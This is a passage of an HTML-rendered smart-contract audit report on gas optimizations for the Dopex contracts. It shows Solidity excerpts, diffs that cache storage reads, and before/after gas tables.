class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _updateFundingRate(totalFundingForEpoch[latestFundingPaymentPointer]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    _updateFundingRate(__totalFundingForEpoch);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     emit PayFunding(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       msg.sender,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      totalFundingForEpoch[latestFundingPaymentPointer],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      latestFundingPaymentPointer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      __totalFundingForEpoch,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _latestFundingPaymentPointer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    return (totalFundingForEpoch[latestFundingPaymentPointer]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    return (__totalFundingForEpoch);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L966-L967\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L966-L967</a></p>\n<h3 id=\"we-dont-have-to-do-delegateslength---1-twice-especially-because-we-are-reading-from-storage-save-136-gas-on-average\" style=\"position:relative;\"><a href=\"#we-dont-have-to-do-delegateslength---1-twice-especially-because-we-are-reading-from-storage-save-136-gas-on-average\" aria-label=\"we dont have to do delegateslength   1 twice especially because we are reading from storage save 136 gas on average permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>We don’t have to do <code>delegates.length - 1</code> twice especially because we are reading from storage (Save 136 Gas on average)</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>648</td>\n<td>85946</td>\n<td>77526</td>\n<td>158526</td>\n</tr>\n<tr>\n<td>After</td>\n<td>648</td>\n<td>85810</td>\n<td>77350</td>\n<td>158350</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"147\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">966</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">LogAddToDelegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_fee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">delegates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">967</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">delegates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"148\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    emit LogAddToDelegate(_amount, _fee, delegates.length - 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    return (delegates.length - 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 _delegateLengthEmit = delegates.length - 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    emit LogAddToDelegate(_amount, _fee, _delegateLengthEmit);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    return (_delegateLengthEmit);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L315-L369\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L315-L369</a></p>\n<h3 id=\"perpetualatlanticvaultsolsettle-addressesperpetualatlanticvaultlp-should-be-cached-save-139-gas\" style=\"position:relative;\"><a href=\"#perpetualatlanticvaultsolsettle-addressesperpetualatlanticvaultlp-should-be-cached-save-139-gas\" aria-label=\"perpetualatlanticvaultsolsettle addressesperpetualatlanticvaultlp should be cached save 139 gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PerpetualAtlanticVault.sol.settle(): <code>addresses.perpetualAtlanticVaultLP</code> should be cached (Save 139 Gas)</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>17113</td>\n<td>60186</td>\n<td>56770</td>\n<td>127485</td>\n</tr>\n<tr>\n<td>After</td>\n<td>17234</td>\n<td>60047</td>\n<td>56664</td>\n<td>127152</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"149\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">315</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">settle</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">328:    </span><span class=\"mtk10\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk10\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk10\">optionIds</span><span class=\"mtk1\">.</span><span class=\"mtk10\">length</span><span class=\"mtk1\">; </span><span class=\"mtk10\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">346</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">// Transfer collateral token from perpetual vault to rdpx rdpxV2Core</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">347</span><span class=\"mtk1\">:    </span><span class=\"mtk10\">collateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk10\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">348</span><span class=\"mtk1\">:      </span><span class=\"mtk10\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk10\">perpetualAtlanticVaultLP</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">349</span><span class=\"mtk1\">:      </span><span class=\"mtk10\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk10\">rdpxV2Core</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">350</span><span class=\"mtk1\">:      </span><span class=\"mtk10\">ethAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">351</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">352</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">// Transfer rdpx from rdpx rdpxV2Core to perpetual vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">353</span><span class=\"mtk1\">:    </span><span class=\"mtk10\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk10\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk10\">rdpx</span><span class=\"mtk1\">).</span><span class=\"mtk10\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">354</span><span class=\"mtk1\">:      </span><span class=\"mtk10\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk10\">rdpxV2Core</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">355</span><span class=\"mtk1\">:      </span><span class=\"mtk10\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk10\">perpetualAtlanticVaultLP</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">356</span><span class=\"mtk1\">:      </span><span class=\"mtk10\">rdpxAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">357</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">359</span><span class=\"mtk1\">:    </span><span class=\"mtk10\">IPerpetualAtlanticVaultLP</span><span class=\"mtk1\">(</span><span class=\"mtk10\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk10\">perpetualAtlanticVaultLP</span><span class=\"mtk1\">).</span><span class=\"mtk10\">subtractLoss</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">360</span><span class=\"mtk1\">:      </span><span class=\"mtk10\">ethAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">361</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">362</span><span class=\"mtk1\">:    </span><span class=\"mtk10\">IPerpetualAtlanticVaultLP</span><span class=\"mtk1\">(</span><span class=\"mtk10\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk10\">perpetualAtlanticVaultLP</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">363</span><span class=\"mtk1\">:      .</span><span class=\"mtk10\">unlockLiquidity</span><span class=\"mtk1\">(</span><span class=\"mtk10\">ethAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">364</span><span class=\"mtk1\">:    </span><span class=\"mtk10\">IPerpetualAtlanticVaultLP</span><span class=\"mtk1\">(</span><span class=\"mtk10\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk10\">perpetualAtlanticVaultLP</span><span class=\"mtk1\">).</span><span class=\"mtk10\">addRdpx</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">365</span><span class=\"mtk1\">:      </span><span class=\"mtk10\">rdpxAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">366</span><span class=\"mtk1\">:    );</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"150\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/perp-vault/PerpetualAtlanticVault.sol b/contracts/perp-vault/PerpetualAtlanticVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 88ac2b3..941da6b 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/perp-vault/PerpetualAtlanticVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/perp-vault/PerpetualAtlanticVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -324,6 +324,7 @@ contract PerpetualAtlanticVault is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _isEligibleSender();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     updateFunding();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address _perpetualAtlanticVaultLP = addresses.perpetualAtlanticVaultLP;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     for (uint256 i = 0; i &lt; optionIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       uint256 strike = optionPositions[optionIds[i]].strike;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -345,23 +346,23 @@ contract PerpetualAtlanticVault is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // Transfer collateral token from perpetual vault to rdpx rdpxV2Core</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     collateralToken.safeTransferFrom(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      addresses.perpetualAtlanticVaultLP,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _perpetualAtlanticVaultLP,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       addresses.rdpxV2Core,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       ethAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // Transfer rdpx from rdpx rdpxV2Core to perpetual vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     IERC20WithBurn(addresses.rdpx).safeTransferFrom(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       addresses.rdpxV2Core,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      addresses.perpetualAtlanticVaultLP,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _perpetualAtlanticVaultLP,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       rdpxAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).subtractLoss(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    IPerpetualAtlanticVaultLP(_perpetualAtlanticVaultLP).subtractLoss(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       ethAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    IPerpetualAtlanticVaultLP(_perpetualAtlanticVaultLP)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       .unlockLiquidity(ethAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).addRdpx(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    IPerpetualAtlanticVaultLP(_perpetualAtlanticVaultLP).addRdpx(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       rdpxAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span></code></pre>\n<h2 id=\"g-10-we-can-avoid-reading-from-state-here\" style=\"position:relative;\"><a href=\"#g-10-we-can-avoid-reading-from-state-here\" aria-label=\"g 10 we can avoid reading from state here permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-10] We can avoid reading from state here</h2>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L113-L124\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L113-L124</a></p>\n<p><strong>This is a different finding from the bot</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"151\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:  </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_name</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_symbol</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">116</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateralToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">117</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_gensis</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">:  ) </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_name</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_symbol</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateralToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">collateralToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateralToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">underlyingSymbol</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">symbol</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">collateralPrecision</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk12\">collateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">genesis</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_gensis</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"152\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/perp-vault/PerpetualAtlanticVault.sol b/contracts/perp-vault/PerpetualAtlanticVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 88ac2b3..4a58e0e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/perp-vault/PerpetualAtlanticVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/perp-vault/PerpetualAtlanticVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -119,8 +119,8 @@ contract PerpetualAtlanticVault is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _validate(_collateralToken != address(0), 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     collateralToken = IERC20WithBurn(_collateralToken);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    underlyingSymbol = collateralToken.symbol();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    collateralPrecision = 10 ** collateralToken.decimals();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    underlyingSymbol = IERC20WithBurn(_collateralToken).symbol();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    collateralPrecision = 10 ** IERC20WithBurn(_collateralToken).decimals();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     genesis = _gensis;</span></span></span></code></pre>\n<h2 id=\"g-11-since-we-have-cached-values-we-should-reference-them-instead-of-making-a-state-read\" style=\"position:relative;\"><a href=\"#g-11-since-we-have-cached-values-we-should-reference-them-instead-of-making-a-state-read\" aria-label=\"g 11 since we have cached values we should reference them instead of making a state read permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-11] Since we have cached values, we should reference them instead of making a state read</h2>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L101-L107\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L101-L107</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"153\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVaultLP</span><span class=\"mtk1\">.</span><span 